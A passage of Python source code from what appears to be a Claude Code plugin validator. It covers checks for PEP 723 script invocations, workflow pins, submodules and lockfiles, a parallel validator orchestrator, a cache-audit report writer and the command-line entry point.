         ``dependencies = []``) AND at least one non-stdlib package, record
         the relative path + basename.
      3. Walk every ``commands/*.md``, ``agents/*.md``, ``skills/**/SKILL.md``,
         ``skills/**/references/*.md``, ``hooks/hooks.json``, ``.mcp.json``,
         ``.lsp.json``, and the plugin's ``README.md`` for invocations
         matching ``\\bpython3?\\s+[^\\n]*<script-basename>``.
      4. Flag every bare-python invocation as MAJOR
         ``[RC-PEP723-INVOCATION-001]``. Use the FIX hint to point at
         ``uv run <script>`` (or ``uv run --with <deps> python <script>`` if
         the plugin author insists on the explicit-deps form).

    Severity is MAJOR — silent runtime breakage for end users is much worse
    than the build-time noise of a wrong invocation pattern. The fixer's
    cpv-codemod already supports a ``python-to-uv-run`` transform; the
    upgrade flow chains it after the validator's report.
    """
    scripts_dir = plugin_root / "scripts"
    if not scripts_dir.is_dir():
        return

    pep723_scripts: list[tuple[str, str]] = []  # [(rel_path, basename)]
    for py_file in sorted(scripts_dir.glob("*.py")):
        try:
            text = py_file.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue
        match = _PEP723_BLOCK_RE.search(text)
        if not match:
            continue
        if not _pep723_has_runtime_deps(match.group("body")):
            continue
        rel = str(py_file.relative_to(plugin_root))
        pep723_scripts.append((rel, py_file.name))

    if not pep723_scripts:
        return

    # Where to look for invocations. Skip ``scripts_dev/`` (gitignored dev
    # scratch — not shipped) and the script files themselves.
    candidate_files: list[Path] = []
    for sub in ("commands", "agents", "skills", "hooks"):
        d = plugin_root / sub
        if d.is_dir():
            candidate_files.extend(p for p in d.rglob("*.md") if p.is_file())
            candidate_files.extend(p for p in d.rglob("*.json") if p.is_file())
    for top_file in (".mcp.json", ".lsp.json", "README.md"):
        f = plugin_root / top_file
        if f.is_file():
            candidate_files.append(f)

    # Build one regex per script — match `python` or `python3` followed by
    # optional flags + any path that ends with the script's basename.
    bare_python_patterns = {
        basename: re.compile(
            rf"\bpython3?\b(?!\s+(?:-c|-m)\b)(?:\s+-[A-Za-z]+)*\s+\S*{re.escape(basename)}\b",
        )
        for _rel, basename in pep723_scripts
    }
    # `uv run python <script>` is acceptable — uv's environment satisfies
    # PEP 723 deps. Detect the prefix to avoid false positives.
    uv_prefix = re.compile(r"\b(?:uvx?|pipx)\s+(?:run\s+)?(?:--[a-z\-]+\s+\S+\s+)*", re.IGNORECASE)

    for cand in sorted(set(candidate_files)):
        try:
            content = cand.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue
        rel_cand = str(cand.relative_to(plugin_root))
        for line_no, line in enumerate(content.splitlines(), start=1):
            for basename, pat in bare_python_patterns.items():
                m = pat.search(line)
                if not m:
                    continue
                # Skip if a uv/uvx/pipx prefix immediately precedes the python token.
                pre = line[: m.start()]
                if uv_prefix.search(pre[-100:]):  # 100-char lookback
                    continue
                report.major(
                    f"[RC-PEP723-INVOCATION-001] Bare `python {basename}` "
                    f"invocation in {rel_cand}:{line_no} — `scripts/{basename}` "
                    f"declares PEP 723 inline runtime deps that bare python "
                    f"ignores. Replace with `uv run scripts/{basename}` (or "
                    f"`uv run --with <deps> python scripts/{basename}` if the "
                    f"plugin author wants explicit deps). The cpv-codemod "
                    f"`python-to-uv-run` transform applies the fix in bulk.",
                    rel_cand,
                    line_no,
                )


def validate_workflow_best_practices(plugin_root: Path, report: ValidationReport) -> None:
    """Check GitHub workflow files for common anti-patterns."""
    workflows_dir = plugin_root / ".github" / "workflows"
    if not workflows_dir.is_dir():
        return
    for wf in workflows_dir.glob("*.yml"):
        try:
            content = wf.read_text(encoding="utf-8", errors="replace")
        except (OSError, UnicodeDecodeError):
            continue
        rel = str(wf.relative_to(plugin_root))
        # Check for uv pip install --system (should use uvx)
        if "uv pip install --system" in content:
            report.nit(f"{rel}: uses 'uv pip install --system' — prefer 'uvx' for reproducible installs", rel)
        # Check for unpinned actions/checkout
        if "actions/checkout@" not in content and "actions/checkout" in content:
            report.nit(f"{rel}: uses 'actions/checkout' without version pin — pin to '@v4' or similar", rel)


# =============================================================================
# Submodule + Language + Lockfile Detection (TRDD-79638eb6)
# =============================================================================


def is_plugin_in_submodule(plugin_root: Path) -> Path | None:
    """Detect if plugin_root is registered as a git submodule of a parent repo.

    Walks up the parent chain from plugin_root looking for any ancestor
    directory that contains a .gitmodules file AND references this plugin's
    relative path as a submodule target.

    Why this matters: when a plugin lives inside a parent repo as a submodule,
    the parent repo's CI will not run the plugin's own workflows automatically
    — the plugin must be released/validated independently. Users are often
    surprised by this.

    Args:
        plugin_root: Absolute path to the plugin directory.

    Returns:
        Path to the parent repo root if the plugin is a submodule, else None.
        The returned path is the directory containing .gitmodules that lists
        this plugin.
    """
    try:
        plugin_abs = plugin_root.resolve()
    except OSError:
        return None

    # Walk up the parent chain. Stop at filesystem root.
    current = plugin_abs.parent
    while True:
        gitmodules = current / ".gitmodules"
        if gitmodules.is_file():
            try:
                content = gitmodules.read_text(encoding="utf-8", errors="replace")
            except OSError:
                content = ""
            # Collect every "path = <relative>" entry in the .gitmodules file.
            # A submodule section looks like:
            #     [submodule "some-name"]
            #         path = some/rel/path
            #         url = https://...
            submodule_paths: list[str] = []
            for line in content.splitlines():
                stripped = line.strip()
                if stripped.startswith("path") and "=" in stripped:
                    _, _, val = stripped.partition("=")
                    submodule_paths.append(val.strip())

            # Compute plugin_abs relative to the candidate parent dir, in POSIX form.
            try:
                rel = plugin_abs.relative_to(current)
            except ValueError:
                rel = None

            if rel is not None:
                rel_posix = rel.as_posix()
                if rel_posix in submodule_paths:
                    return current

        # Stop at filesystem root — current.parent == current means we've bottomed out.
        if current.parent == current:
            return None
        current = current.parent


def validate_submodule_containment(plugin_root: Path, report: ValidationReport) -> None:
    """Emit INFO when the plugin lives inside a parent repo as a git submodule.

    Parent repos do not run their submodules' CI — users need to know they
    must trigger the plugin's own release pipeline independently.
    """
    parent = is_plugin_in_submodule(plugin_root)
    if parent is None:
        return
    try:
        parent_display = str(parent)
    except Exception:  # noqa: BLE001 — str() on a Path is pathological; degrade the INFO message rather than crash the run
        parent_display = "<parent>"
    report.info(
        f"Plugin is a submodule of {parent_display}. Parent repo CI will not run this plugin's pipeline automatically."
    )


def validate_project_languages(plugin_root: Path, report: ValidationReport) -> dict[str, Path]:
    """Detect and report which languages the plugin uses.

    Emits a single INFO line listing all detected languages. The caller can
    use the returned dict to pick which linters/toolchains to invoke.

    Returns:
        Mapping of language -> marker file path (may be empty).
    """
    langs = detect_languages(plugin_root)
    if not langs:
        report.info("No language markers detected (pyproject.toml, package.json, Cargo.toml, etc.)")
        return langs
    names = sorted(langs.keys())
    # Build a concise one-line summary for the report
    summary = ", ".join(f"{name} ({langs[name].name})" for name in names)
    report.info(f"Detected project languages: {summary}")
    return langs


def validate_lockfiles(plugin_root: Path, report: ValidationReport, detected_languages: dict[str, Path]) -> None:
    """Scan for known lockfiles and flag orphan lockfiles or gitignored lockfiles.

    Emits:
        - NIT: lockfile present but its language was not detected (orphan).
               Usually means a config file was removed but the lockfile was left
               behind, or the plugin inherited a lockfile from a parent repo.
        - WARNING: lockfile present but listed in .gitignore. This defeats the
                   purpose of a lockfile — CI will reinstall with unpinned deps
                   and drift from whatever the developer tested.

    Args:
        plugin_root: Plugin directory.
        report: Where to record findings.
        detected_languages: Output from detect_languages() — used to determine
            whether each lockfile has a matching detected language.
    """
    lockfiles = detect_lockfiles(plugin_root)
    if not lockfiles:
        return

    # Parse the .gitignore so we can detect lockfiles that are being filtered
    # out before they reach CI. Use the project-local filter to pick up nested
    # rules as well (it handles walking up to find parent .gitignores).
    gitignore_path = plugin_root / ".gitignore"
    ignored_patterns: list[str] = []
    if gitignore_path.is_file():
        try:
            gi_content = gitignore_path.read_text(encoding="utf-8", errors="replace")
        except OSError:
            gi_content = ""
        for line in gi_content.splitlines():
            s = line.strip()
            if s and not s.startswith("#"):
                ignored_patterns.append(s)

    for lockfile_name, language in sorted(lockfiles.items()):
        rel = lockfile_name
        # Orphan check: lockfile present but no manifest for its language.
        # "js" and "ts" share the same lockfiles — a TypeScript project with
        # only .ts files would still register "ts" (not "js") but its
        # package-lock.json is not orphaned. Treat "js" lockfiles as matched
        # when either "js" or "ts" is detected.
        matched = False
        if language in detected_languages:
            matched = True
        elif language == "js" and "ts" in detected_languages:
            matched = True
        if not matched:
            report.nit(
                f"Lockfile {lockfile_name} present but no {language} project detected — "
                "orphan lockfile (leftover from a removed toolchain?)",
                rel,
            )
            # Still check gitignore status below — both can fire for the same lockfile.

        # Gitignore check: an ignored lockfile will not ship to CI.
        # Use a conservative substring / exact match — we only compare the
        # filename against each active .gitignore entry. Patterns like
        # "*.lock" or "lockfiles/" also match.
        if _lockfile_is_gitignored(lockfile_name, ignored_patterns):
            report.warning(
                f"Lockfile {lockfile_name} is listed in .gitignore — CI will install "
                "with unpinned deps and drift from tested versions",
                rel,
            )


def _lockfile_is_gitignored(lockfile_name: str, patterns: list[str]) -> bool:
    """Cheap check: does any active .gitignore pattern match this lockfile name?

    Uses exact match, substring match, and trivial wildcard expansion. This
    intentionally mirrors the common .gitignore patterns a user would write
    for a lockfile (`uv.lock`, `*.lock`, `/Cargo.lock`) rather than
    implementing the full gitignore grammar.
    """
    lower_name = lockfile_name.lower()
    for pat in patterns:
        # Strip leading slash — anchored pattern, still a basename match
        candidate = pat.lstrip("/")
        if not candidate:
            continue
        # Direct exact match
        if candidate == lockfile_name:
            return True
        # Case-insensitive direct match
        if candidate.lower() == lower_name:
            return True
        # fnmatch glob support (covers *.lock, *lock*, etc.)
        if fnmatch.fnmatch(lockfile_name, candidate):
            return True
        if fnmatch.fnmatch(lower_name, candidate.lower()):
            return True
    return False


def _find_plugin_candidates(root: Path, max_depth: int = 3) -> list[Path]:
    """Scan ``root`` up to ``max_depth`` levels deep for plugin folders.

    A folder counts as a plugin candidate when it has either:
    - ``.claude-plugin/plugin.json`` (CPV-preferred layout), or
    - ``plugin.json`` at the folder root (auto-discovery legacy layout).

    Skips common no-go directories (node_modules, .git, .venv, __pycache__,
    dist, build, _dev suffixed folders, cache) so we don't flood the hint
    with irrelevant hits.
    """
    skip_names = {
        "node_modules",
        ".git",
        ".venv",
        "venv",
        "__pycache__",
        "dist",
        "build",
        "target",
        ".idea",
        ".vscode",
        "tmp",
        "vendor",
        "cache",
    }
    candidates: list[Path] = []

    def _walk(d: Path, depth: int) -> None:
        if depth > max_depth:
            return
        try:
            entries = list(d.iterdir())
        except (OSError, PermissionError):
            return
        # Is this folder itself a plugin?
        if (d / ".claude-plugin" / "plugin.json").is_file() or (d / "plugin.json").is_file():
            if d != root:
                candidates.append(d)
            return  # don't descend further once a plugin root is hit
        for entry in entries:
            if not entry.is_dir():
                continue
            if entry.name in skip_names or entry.name.endswith("_dev"):
                continue
            _walk(entry, depth + 1)

    _walk(root, 0)
    return candidates


def _classify_path(path: Path) -> str:
    """Return a short human-readable classification for a non-plugin path.

    Helps the user understand WHY the path they passed is not a plugin root,
    and what to do next. Used by the "no plugin found" error to give
    targeted guidance (different messages for marketplaces, skills,
    project ``.claude/`` configs, cache directories, etc.).
    """
    name = path.name
    parent_name = path.parent.name if path.parent != path else ""
    # Marketplace folder
    if (path / ".claude-plugin" / "marketplace.json").is_file() or (path / "marketplace.json").is_file():
        return "marketplace"
    # Standalone skill folder (has SKILL.md but NO plugin.json). Easy to confuse
    # with a plugin because both live in "plugin-like" directories.
    if (path / "SKILL.md").is_file() and not (path / ".claude-plugin" / "plugin.json").is_file():
        # Distinguish a skill nested INSIDE a plugin's skills/<name>/ from a truly
        # standalone skill by checking ancestors within 3 levels for plugin.json.
        # Path.parent is always a Path (never None), so the loop terminates on
        # the filesystem-root self-parent check below, not on a None guard.
        ancestor: Path = path.parent
        for _ in range(3):
            if (ancestor / ".claude-plugin" / "plugin.json").is_file():
                return "skill_inside_plugin"
            if ancestor.parent == ancestor:
                break
            ancestor = ancestor.parent
        return "standalone_skill"
    # Project-scoped Claude config (.claude/ in a project root): a dir literally
    # named `.claude` (the canonical marker), OR any dir that structurally looks
    # like one by carrying BOTH settings.json and a plugins/ subdir. The explicit
    # parens disambiguate operator precedence — `and` binds tighter than `or`, so
    # without them the reader cannot tell whether the plugins/ requirement also
    # gates the `.claude` name (it does not, and should not).
    if name == ".claude" or ((path / "settings.json").is_file() and (path / "plugins").is_dir()):
        return "claude_project_config"
    # Global Claude plugin cache
    try:
        if ".claude" in path.parts and "cache" in path.parts:
            return "plugin_cache"
    except ValueError:
        pass
    # Home/projects parent
    if parent_name in {"projects", "Code", "code", "workspace", "dev"}:
        return "dev_parent"
    return "unknown"


def _format_no_plugin_found_hint(plugin_root: Path) -> str:
    """Compose the multi-line error emitted when ``plugin_root`` is not a plugin.

    The output has three parts:
    1. A classified explanation of what the path looks like (marketplace,
       ``.claude/`` project config, cache, etc.).
    2. A list of plugin candidates found within 3 levels, ranked by proximity.
    3. A reminder of how to pass the right path.
    """
    lines = [f"Error: No Claude Code plugin found at {plugin_root}"]
    classification = _classify_path(plugin_root)
    if classification == "marketplace":
        lines.append(
            "  → This path looks like a MARKETPLACE (has marketplace.json), not a plugin. "
            "Use `validate_marketplace.py` for marketplaces, or pick a plugin subfolder for `validate_plugin.py`."
        )
    elif classification == "standalone_skill":
        lines.append(
            "  → This path looks like a STANDALONE SKILL (has SKILL.md, no plugin.json). "
            "Skills and plugins are different things — skills are single folders dropped into "
            "`~/.claude/skills/` (user scope) or `<project>/.claude/skills/` (project/local scope), "
            "and do NOT need a marketplace or plugin.json. If you want to validate a skill, use "
            "`validate_skill.py` or the `skill-validation-agent`. If you meant to scaffold this as a "
            "full plugin, you need to wrap it in a plugin folder with `.claude-plugin/plugin.json` first."
        )
    elif classification == "skill_inside_plugin":
        lines.append(
            "  → This path is a SKILL INSIDE A PLUGIN (has SKILL.md; a parent folder has plugin.json). "
            "`validate_plugin.py` wants the PLUGIN root, not the skill. Use `validate_skill.py` to "
            "validate this skill on its own, or move up to the plugin root (the ancestor folder with "
            "`.claude-plugin/plugin.json`) to validate the whole plugin."
        )
    elif classification == "claude_project_config":
        lines.append(
            "  → This path looks like a project-scoped `.claude/` config directory. That holds INSTALLED "
            "plugin metadata (`.claude/plugins/cache/`), NOT plugin sources. Point to the source folder you "
            "maintain (the one with `.claude-plugin/plugin.json`)."
        )
    elif classification == "plugin_cache":
        lines.append(
            "  → This path looks like the global Claude plugin cache (~/.claude/plugins/cache/). That is a "
            "read-only copy created at install time, not a source. Point to the plugin's source repo/folder."
        )
    elif classification == "dev_parent":
        lines.append(
            "  → This path looks like a dev parent folder (projects/, Code/, workspace/, dev/). "
            "It is not the plugin itself — the plugin lives in a subfolder."
        )
    candidates = _find_plugin_candidates(plugin_root, max_depth=3)
    if candidates:
        lines.append("")
        if len(candidates) == 1:
            c = candidates[0]
            rel = c.relative_to(plugin_root) if c.is_relative_to(plugin_root) else c
            lines.append(f"  Did you mean: {rel}   (full path: {c})")
            lines.append(f"  Try:  uv run python scripts/validate_plugin.py {c}")
        else:
            lines.append(f"  Found {len(candidates)} plugin candidate(s) under this path:")
            for c in candidates[:10]:
                rel = c.relative_to(plugin_root) if c.is_relative_to(plugin_root) else c
                lines.append(f"    - {rel}   (full path: {c})")
            if len(candidates) > 10:
                lines.append(f"    ... and {len(candidates) - 10} more")
            lines.append("  Pass one of the above paths to validate a specific plugin.")
    else:
        lines.append("")
        lines.append(
            "  No plugin folders were found within 3 levels. Expected layout: "
            "`<plugin-root>/.claude-plugin/plugin.json`. Check the path and try again, "
            "or run the scaffolder (`generate_plugin_repo.py`) to create a new plugin here."
        )
    return "\n".join(lines)


# =============================================================================
# Orchestrator parallelism — task #384
# =============================================================================
#
# WHY threads, not processes:
#   * Many individual validators ALREADY use ProcessPoolExecutor internally
#     (validate_skill, validate_security, validate_hook, …). Nesting another
#     ProcessPoolExecutor at the orchestrator layer either deadlocks on
#     daemon-process restrictions or wastes memory by spawning O(N*M)
#     workers. A ThreadPoolExecutor at the outer layer DISPATCHES the
#     validators concurrently while letting each one keep its own
#     internal process pool — the Python-side cost is the GIL during
#     orchestrator-thread coordination, which is negligible.
#   * The actual CPU-bound work is INSIDE the validators (regex scanning,
#     AST walking, subprocess linters). The orchestrator thread mostly
#     waits on subprocess + IO completion, where the GIL is released.
#
# WHY per-validator private reports:
#   * Each validator's `report.add(...)` calls mutate a shared list. Two
#     threads appending concurrently to the same list is technically safe
#     (list.append is atomic under the GIL) but ORDER becomes
#     non-deterministic — interleavings differ across runs and the parity
#     gate against the serial baseline fails.
#   * Giving each validator its own ValidationReport, then merging them
#     into the umbrella report IN THE SAME ORDER as the serial code's
#     call sequence, guarantees BIT-IDENTICAL output to the serial path
#     regardless of which validator finished first.
#
# WHY a fixed worker cap:
#   * We don't want to flood the system with N validators × M internal
#     pool workers. The orchestrator pool is set to len(validators) so
#     every task gets to start; concurrency at the orchestrator layer
#     is bounded by the validator count (~30), and the actual CPU
#     parallelism comes from the validators' own pools.
# =============================================================================


def _orchestrator_parallel_enabled() -> bool:
    """Read CPV_ORCHESTRATOR_PARALLEL env-var.

    Returns False when set to "0" / "false" / "no" / "off" (case-insensitive);
    any other value or unset → True (default = parallel).

    Mirrors the convention established by ``CPV_HOOK_PARALLEL`` in
    ``validate_hook.py`` so users / CI scripts have a uniform on/off switch
    for the whole concurrency stack.
    """
    val = os.environ.get("CPV_ORCHESTRATOR_PARALLEL")
    if val is None:
        return True
    return val.strip().lower() not in {"0", "false", "no", "off"}


def _make_validator_report() -> ValidationReport:
    """Create a fresh per-validator ValidationReport.

    Factored out so a future refactor (e.g. tracking which validator
    produced which finding for diagnostics) can swap in a subclass
    without touching the orchestrator loop body.
    """
    return ValidationReport()


def _run_one_validator(
    name: str,
    callable_: Any,
    plugin_root: Path,
    args_kwargs: tuple[tuple, dict] = ((), {}),
) -> tuple[str, ValidationReport, Exception | None]:
    """Run a single validator with its own private report, capturing errors.

    Returns ``(name, sub_report, error_or_None)``. The orchestrator merges
    ``sub_report`` into the umbrella report in deterministic order; ``error``
    is surfaced as a MINOR on the umbrella when non-None so a buggy
    validator never crashes the whole run (matches the boundary-error
    pattern used by ``_run_xref_in_pipeline`` and ``_run_cache_audit_separate``).
    """
    sub_report = _make_validator_report()
    pos_args, kw_args = args_kwargs
    try:
        callable_(plugin_root, sub_report, *pos_args, **kw_args)
        return (name, sub_report, None)
    except Exception as exc:  # noqa: BLE001 — defensive boundary, must not crash orchestrator
        return (name, sub_report, exc)


def _run_parallel_batch(
    tasks: list[tuple[str, Any, tuple[tuple, dict]]],
    plugin_root: Path,
    main_report: ValidationReport,
) -> None:
    """Dispatch ``tasks`` to a ThreadPoolExecutor and merge in input order.

    ``tasks`` is a list of ``(name, callable, (pos_args, kw_args))`` tuples.
    Each task gets its own ``ValidationReport``; after all tasks complete,
    the per-task reports are merged into ``main_report`` in the order tasks
    appear in the list — NOT in completion order — so the final result
    sequence is identical to the equivalent serial loop.

    Errors raised by a validator are caught and surfaced as a MINOR finding
    on the umbrella report; the rest of the batch proceeds.
    """
    if not tasks:
        return

    # Lazy import — only pay the cost when parallel mode is actually used.
    from concurrent.futures import ThreadPoolExecutor

    # n_workers = len(tasks) lets every validator start immediately. The
    # outer pool only dispatches; the inner ProcessPool inside each
    # validator is what consumes CPU. Capping further would just serialize
    # validators that could otherwise overlap their IO + subprocess waits.
    n_workers = max(1, len(tasks))

    # future_to_index lets us merge in input order (results[i] for i in 0..N-1)
    # rather than completion order — preserves the serial-path's result
    # sequence for the parity gate.
    results: list[tuple[str, ValidationReport, Exception | None] | None] = [None] * len(tasks)

    with ThreadPoolExecutor(max_workers=n_workers, thread_name_prefix="cpv-orch") as executor:
        future_to_index = {
            executor.submit(_run_one_validator, name, fn, plugin_root, args): idx
            for idx, (name, fn, args) in enumerate(tasks)
        }
        for future, idx in future_to_index.items():
            try:
                results[idx] = future.result()
            except Exception as exc:  # noqa: BLE001 — last-resort defensive
                # Should never fire because _run_one_validator catches its
                # own exceptions, but if the future itself errors we mark
                # the slot with an error rather than letting the merge fail.
                name = tasks[idx][0]
                results[idx] = (name, _make_validator_report(), exc)

    # Merge in input order. The serial baseline's result sequence is
    # task[0].results ++ task[1].results ++ ... ++ task[N-1].results.
    for slot in results:
        assert slot is not None, "parallel batch internal invariant: every task must produce a slot"
        slot_name, sub_report, slot_exc = slot
        main_report.merge(sub_report)
        if slot_exc is not None:
            # A comprehensive validator that crashed mid-run is an INDETERMINATE
            # result: whatever findings it would have produced (potentially
            # CRITICAL — e.g. the xref validator owns RC-GHOST-DISPATCH-001) are
            # lost. Surfacing the crash at MAJOR (not MINOR) keeps the verdict
            # blocking/INVALID so a validator bug cannot silently let a bad
            # plugin pass, while the rest of the batch still proceeds (we do not
            # re-raise). This mirrors the fail-closed posture of the gitmodules
            # import-failure path (CRITICAL) — a crash is never a clean pass.
            main_report.major(f"Validator '{slot_name}' crashed: {type(slot_exc).__name__}: {slot_exc}")


def _run_xref_in_pipeline(plugin_root: Path, report: ValidationReport) -> None:
    """Run cross-reference validation and merge findings into the main report.

    Per TRDD-25b9be90, ghost-agent dispatch detection (RC-GHOST-DISPATCH-001
    CRITICAL) lives in validate_xref.py. Wiring its findings into the main
    `validate_plugin` pipeline makes them visible to `cpv-validate-plugin`
    and every consumer of the main report.

    Args:
        plugin_root: Root path of the plugin being validated.
        report: The main validation report to merge findings into.
    """
    try:
        from validate_xref import validate_cross_references
    except ImportError as e:
        report.minor(f"Cross-reference validator unavailable: {e}")
        return

    try:
        xref_report = validate_cross_references(plugin_root)
    except Exception as e:  # noqa: BLE001 — defensive boundary
        # MAJOR: the xref validator owns RC-GHOST-DISPATCH-001 (CRITICAL). A
        # crash here loses that check — surface it as a blocking finding so the
        # verdict cannot pass on an indeterminate cross-reference scan.
        report.major(f"Cross-reference validation crashed: {type(e).__name__}: {e}")
        return

    # Merge results into the main report. Each ValidationResult is
    # appended verbatim — severity and message strings are preserved.
    for result in xref_report.results:
        report.results.append(result)


def _derive_cache_report_path(main_report_path: Path) -> Path:
    """Sibling path for the separate cache-audit report.

    ``…/validate_plugin/<ts>-<slug>.md`` → ``…/<ts>-<slug>-cache-audit.md``
    (same directory as the main report — no assumption about the reports/
    tree layout, so it works whatever path the launcher passed).
    """
    return main_report_path.with_name(f"{main_report_path.stem}-cache-audit{main_report_path.suffix}")


def _run_cache_audit_separate(plugin_root: Path, main_report_path: str | None, report: ValidationReport) -> str | None:
    """CALL (not integrate) the cache validator: write its own report + a pointer.

    Per the user's design choice (TRDD-25b9be90 follow-up, v2.102.0): the cache
    audit (CA-01..CA-06, all WARNING since v2.102.0) runs as a SEPARATE step
    that writes its OWN report file. Only a one-line pointer lands in the main
    report — the cache findings never enter the main report's results, counts,
    or VALID/INVALID verdict. The standalone ``cpv-cache-optimize`` audit/fix
    commands remain the way to act on these findings.

    Returns the one-line pointer string (also added to ``report`` as INFO so it
    appears in the saved main report) or ``None`` when the audit was skipped.
    """
    # Marketplace-only trees have no plugin.json — the cache scanner would just
    # emit a CRITICAL "no plugin.json"; skip rather than write a noise report.
    if not (plugin_root / ".claude-plugin" / "plugin.json").is_file():
        return None

    try:
        from validate_cache import print_results as cache_print_results  # noqa: PLC0415
        from validate_cache import scan_plugin_for_cache  # noqa: PLC0415
    except ImportError as e:
        report.info(f"Cache audit skipped (validator unavailable): {e}")
        return None

    try:
        cache_report = scan_plugin_for_cache(plugin_root)
    except Exception as e:  # noqa: BLE001 — defensive boundary, audit must never abort the main run
        report.info(f"Cache audit skipped (error: {e})")
        return None

    warning_count = sum(1 for r in cache_report.results if getattr(r, "level", None) == "WARNING")

    if main_report_path:
        cache_path = _derive_cache_report_path(Path(main_report_path))
        cache_path.parent.mkdir(parents=True, exist_ok=True)
        # Write-only: capture the verbose render WITHOUT printing a second
        # compact summary (we only want a one-line pointer, not a full block).
        import io  # noqa: PLC0415

        old_stdout = sys.stdout
        sys.stdout = buffer = io.StringIO()
        try:
            cache_print_results(cache_report, True)
        finally:
            sys.stdout = old_stdout
        # Atomic write: tmp sibling + os.replace, matching the canonical
        # save_report_and_print_summary pattern. A bare write_text leaves a
        # truncated/partial report on disk if the process is interrupted
        # mid-write, and a reader would then consume a corrupt cache report.
        tmp_cache_path = cache_path.with_suffix(cache_path.suffix + ".tmp")
        tmp_cache_path.write_text(buffer.getvalue())
        os.replace(tmp_cache_path, cache_path)
        if warning_count:
            pointer = f"Cache audit: {warning_count} WARNING(s) (CA-01..CA-06, non-blocking) — see {cache_path}"
        else:
            pointer = f"Cache audit: clean (0 cache-discipline warnings) — see {cache_path}"
    else:
        # No --report path to anchor a sibling file. Surface a one-line count
        # only; the dedicated `cpv-cache-optimize` command writes a real report.
        if warning_count:
            pointer = (
                f"Cache audit: {warning_count} WARNING(s) (CA-01..CA-06, non-blocking) — "
                "run `cpv-cache-optimize` (or pass --report) to save the cache report"
            )
        else:
            pointer = "Cache audit: clean (0 cache-discipline warnings)"

    report.info(pointer)
    return pointer


def main() -> int:
    """Main entry point.

    First action: verify CPV's own source has not been tampered with
    by checking each validator file's SHA256 against the GitHub
    canonical manifest for the running plugin version. Exits with
    code 2 on mismatch — a tampered validator cannot be trusted.
    """
    from _plugin_verify_hashes import verify_self_integrity  # noqa: PLC0415

    verify_self_integrity(quiet=True)

    check_remote_execution_guard()

    from cpv_validation_common import launcher_epilog

    parser = argparse.ArgumentParser(
        description="Validate a Claude Code plugin against all validation rules.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "This is the main entry point. It orchestrates all 17 sub-validators.\n"
            "Security: the in-process pass is the native skillaudit port (mandatory,\n"
            "in-process). The full validate_security 27-Check suite is a separate\n"
            "standalone CLI run by the publish pipeline / `cpv-validate-security`.\n\n" + launcher_epilog("plugin")
        ),
    )
    parser.add_argument(
        "--verbose",
        "-v",
        action="store_true",
        help="Show all results including passed checks",
    )
    parser.add_argument("--json", action="store_true", help="Output as JSON")
    parser.add_argument(
        "--marketplace-only",
        action="store_true",
        help="Skip plugin.json requirement (for strict=false marketplace distribution)",
    )
    parser.add_argument(
        "--skip-platform-checks",
        nargs="*",
        metavar="PLATFORM",
        help="Skip platform-specific checks (e.g., --skip-platform-checks windows). Valid platforms: windows, macos, linux. Use without args to skip all.",
    )
    parser.add_argument("--strict", action="store_true", help="Strict mode — NIT issues also block validation")
    parser.add_argument("--no-color", action="store_true", help="Disable ANSI color codes in output")
    parser.add_argument(
        "--report", type=str, default=None, help="Save detailed report to file, print only summary to stdout"
    )
    # TRDD-20108ab7 (2026-05-10): explicit hosting-marketplace override.
    # When passed, the plugin's cross-marketplace dep allowlist is checked
    # against THIS marketplace.json instead of the auto-discovered one.
    # Useful for CI where the plugin lives outside its production marketplace
    # tree (e.g. a worktree, a packed tarball, or a freshly cloned PR).
    parser.add_argument(
        "--marketplace-context",
        type=str,
        default=None,
        metavar="PATH",
        help=(
            "Path to a marketplace.json (or its containing directory) that "
            "should be treated as the plugin's hosting marketplace for "
            "cross-marketplace dependency-allowlist enforcement. Overrides "
            "auto-discovery. See plugin-dependencies.md:54-79."
        ),
    )
    parser.add_argument("path", nargs="?", help="Plugin root path (default: parent of scripts/)")
    args = parser.parse_args()

    # Disable ANSI colors when --no-color is passed or stdout is not a TTY.
    # Use the set_color_enabled() helper instead of mutating COLORS — direct
    # mutation is shared-state pollution that flares under pytest-xdist
    # parallel workers (one worker's --no-color clobbers COLORS for every
    # subsequent colorize() call by any other test in the same process).
    if args.no_color or not (hasattr(sys.stdout, "isatty") and sys.stdout.isatty()):
        import cpv_validation_common

        cpv_validation_common.set_color_enabled(False)

    # Determine plugin root — always resolve to absolute path so relative_to() works
    if args.path:
        plugin_root = Path(args.path).resolve()
    else:
        plugin_root = Path(__file__).resolve().parent.parent

    if not plugin_root.is_dir():
        # Typo-tolerant hint: scan the parent for similarly-named folders
        # that DO exist, so a mistyped path gets a "did you mean" suggestion.
        msg = [f"Error: {plugin_root} is not a directory (or does not exist)"]
        parent = plugin_root.parent
        if parent.is_dir() and parent != plugin_root:
            target_name = plugin_root.name.lower()
            try:
                siblings = [d for d in parent.iterdir() if d.is_dir() and not d.name.startswith(".")]
            except (OSError, PermissionError):
                siblings = []
            near = [d for d in siblings if target_name in d.name.lower() or d.name.lower() in target_name]
            if near:
                msg.append("  Did you mean one of these?")
                for d in near[:5]:
                    msg.append(f"    - {d}")
            elif siblings:
                msg.append(f"  Parent {parent} exists. Plugin folders I can see there:")
                for d in siblings[:8]:
                    has_plugin = (d / ".claude-plugin" / "plugin.json").is_file() or (d / "plugin.json").is_file()
                    marker = "  ← plugin" if has_plugin else ""
                    msg.append(f"    - {d.name}{marker}")
        print("\n".join(msg), file=sys.stderr)
        return 1

    # Auto-resolve plugin cache directories that contain version subdirectories
    # e.g. ~/.claude/plugins/cache/marketplace/plugin-name/{1.0.0, 1.1.7}
    if not (plugin_root / ".claude-plugin").is_dir():
        version_dirs = sorted(
            [d for d in plugin_root.iterdir() if d.is_dir() and re.match(r"\d+\.\d+", d.name)],
            key=lambda d: d.name,
            reverse=True,
        )
        if version_dirs and (version_dirs[0] / ".claude-plugin").is_dir():
            plugin_root = version_dirs[0]
            print(f"Auto-resolved to latest version: {plugin_root.name}", file=sys.stderr)
        elif not args.marketplace_only:
            # No .claude-plugin/ at this path — scan for nearby candidates + explain
            # what kind of folder this looks like, so the agent/user can correct course.
            print(_format_no_plugin_found_hint(plugin_root), file=sys.stderr)
            return 1

    # Marketplace short-circuit: if the path has marketplace.json but NO plugin.json,
    # this is a marketplace folder, not a plugin. Bail with a targeted error so we
    # don't emit dozens of false positives ("Non-standard directory") for the
    # plugin subfolders that ARE the marketplace's content.
    has_marketplace = (plugin_root / ".claude-plugin" / "marketplace.json").is_file() or (
        plugin_root / "marketplace.json"
